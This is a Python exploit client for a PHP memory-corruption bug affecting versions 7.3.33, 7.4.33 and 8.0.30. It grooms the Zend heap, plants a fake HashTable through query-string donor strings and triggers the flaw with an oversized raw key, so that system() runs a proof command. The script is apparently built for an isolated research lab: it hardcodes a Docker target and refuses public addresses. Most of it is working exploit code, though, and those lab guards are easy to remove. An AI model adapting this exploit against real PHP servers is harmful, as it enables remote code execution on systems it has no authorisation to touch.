#!/usr/bin/env python3
"""Fixed-purpose client for the shared raw-key research lab.

There is intentionally no target or command option.  The only destination is
the Docker network alias ``target:80`` and the only execution proof embedded
in the payload is ``id>/out/p``.  The measured layout is shared by the exact
PHP 7.3.33, 7.4.33, and 8.0.30 profiles selected by the host runner.
"""

from __future__ import annotations

import argparse
import ipaddress
import json
import socket
import struct
import time
from urllib.parse import quote_from_bytes


TARGET_HOST = "target"
TARGET_PORT = 80
KEY_LENGTH = 7_400_000
PROOF_COMMAND = b"id>/out/p\x00"

LAB_NETWORKS = tuple(
    ipaddress.ip_network(value)
    for value in (
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "fc00::/7",
    )
)


def require_isolated_target() -> None:
    addresses = {
        ipaddress.ip_address(item[4][0])
        for item in socket.getaddrinfo(
            TARGET_HOST, TARGET_PORT, type=socket.SOCK_STREAM
        )
    }
    if not addresses:
        raise RuntimeError("the fixed Docker target alias did not resolve")
    for address in addresses:
        if not any(
            address.version == network.version and address in network
            for network in LAB_NETWORKS
        ):
            raise RuntimeError(f"refusing non-private target address: {address}")


def request(method: str, path: str, body: bytes = b"") -> bytes:
    headers = [
        f"{method} {path} HTTP/1.1",
        f"Host: {TARGET_HOST}",
        "Connection: close",
        f"Content-Length: {len(body)}",
    ]
    if body:
        headers.append("Content-Type: application/x-www-form-urlencoded")
    wire = ("\r\n".join(headers) + "\r\n\r\n").encode("ascii") + body
    try:
        with socket.create_connection((TARGET_HOST, TARGET_PORT), 10) as sock:
            sock.settimeout(90)
            sock.sendall(wire)
            chunks: list[bytes] = []
            while True:
                data = sock.recv(65536)
                if not data:
                    break
                chunks.append(data)
            return b"".join(chunks)
    except OSError as exc:
        # An OOM or post-proof worker exit may reset the connection.  The
        # proof file, checked separately, is the terminal success condition.
        return f"CLIENT_ERROR:{type(exc).__name__}:{exc}".encode()


def wait_until_ready() -> None:
    require_isolated_target()
    for _ in range(100):
        response = request("GET", "/index.php")
        if b"SCRIPT_REACHED" in response:
            return
        time.sleep(0.1)
    raise RuntimeError("the isolated target did not become ready")


def print_runtime() -> None:
    response = request("GET", "/runtime.php")
    status, separator, remainder = response.partition(b"\r\n")
    if not separator or b" 200 " not in status:
        raise RuntimeError("runtime endpoint did not return HTTP 200")
    _headers, separator, body = remainder.partition(b"\r\n\r\n")
    if not separator:
        raise RuntimeError("runtime endpoint response was malformed")
    value = json.loads(body.decode("utf-8"))
    if not isinstance(value, dict):
        raise RuntimeError("runtime endpoint did not return a JSON object")
    print(json.dumps(value, sort_keys=True, separators=(",", ":")))


def donor_query(control: bool, ar_data: int | None, system: int | None) -> str:
    """Build the fixed 320-byte-bin donor layout.

    A 264-byte zend_string allocation and the initial eight-Bucket mixed
    HashTable allocation both occupy the measured x86-64 320-byte Zend-MM bin.
    """

    if control:
        stale_bucket = struct.pack(
            "<QIIQQ",
            0,       # non-refcounted value
            4,       # IS_LONG
            0,
            0x1337,
            0,
        )
    else:
        if ar_data is None or system is None:
            raise ValueError("calibrated addresses are required for exploit mode")
        fake_ht_address = ar_data + 32
        command_address = ar_data + 96
        stale_bucket = struct.pack(
            "<QIIQQ",
            fake_ht_address,
            0x307,   # IS_ARRAY_EX
            0,
            0,
            0,
        )

    donor = bytearray(b"D" * 264)
    donor[:17] = b"CONTROLLED_BUCKET"
    donor[40:72] = stale_bucket

    if not control:
        assert ar_data is not None and system is not None
        fake_ht = struct.pack(
            "<IIIIQIIIIQQ",
            1,       # gc.refcount
            0x17,    # GC_ARRAY
            0x10,    # HASH_FLAG_STATIC_KEYS
            0,       # nTableMask
            ar_data + 96,
            1,       # nNumUsed
            1,       # nNumOfElements
            8,       # nTableSize
            0,       # nInternalPointer
            0,       # nNextFreeElement
            system,
        )
        donor[72:72 + len(fake_ht)] = fake_ht
        donor[136:136 + len(PROOF_COMMAND)] = PROOF_COMMAND

    encoded = quote_from_bytes(bytes(donor), safe="")
    query = [f"q{index}={encoded}" for index in range(9)]
    # These replacements create the measured LIFO free-list order.
    query.extend(f"q{index}=U" for index in (6, 0, 1, 2, 3, 4))
    return "&".join(query)


def send_trigger(control: bool, ar_data: int | None, system: int | None) -> bytes:
    warm = b"&".join(b"w%d=" % index + b"W" * 264 for index in range(8))
    request("POST", "/index.php", warm)
    request("POST", "/index.php", warm)

    body = b"R" * KEY_LENGTH + b"[x]=v"
    query = donor_query(control, ar_data, system)
    return request("POST", "/index.php?" + query, body)


def parse_address(value: str) -> int:
    address = int(value, 0)
    if address <= 0 or address >= 1 << 64:
        raise argparse.ArgumentTypeError("address is outside the 64-bit range")
    return address


def main() -> int:
    parser = argparse.ArgumentParser(
        description="fixed client for the isolated raw-key PHP lab"
    )
    subparsers = parser.add_subparsers(dest="mode", required=True)
    subparsers.add_parser("runtime")
    subparsers.add_parser("control")
    exploit = subparsers.add_parser("exploit")
    exploit.add_argument("--ar-data", required=True, type=parse_address)
    exploit.add_argument("--system", required=True, type=parse_address)
    args = parser.parse_args()

    wait_until_ready()
    if args.mode == "runtime":
        print_runtime()
        return 0
    control = args.mode == "control"
    response = send_trigger(
        control,
        None if control else args.ar_data,
        None if control else args.system,
    )
    first_line = response.partition(b"\r\n")[0]
    print(first_line.decode("latin1", "replace") if first_line else "EOF")

    if control:
        print("CONTROL_TRIGGER_SENT")
        return 0

    # The unprivileged attacker has no proof-volume mount. The host runner
    # verifies /out/p from the target after this fixed trigger completes.
    print("EXPLOIT_TRIGGER_SENT")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
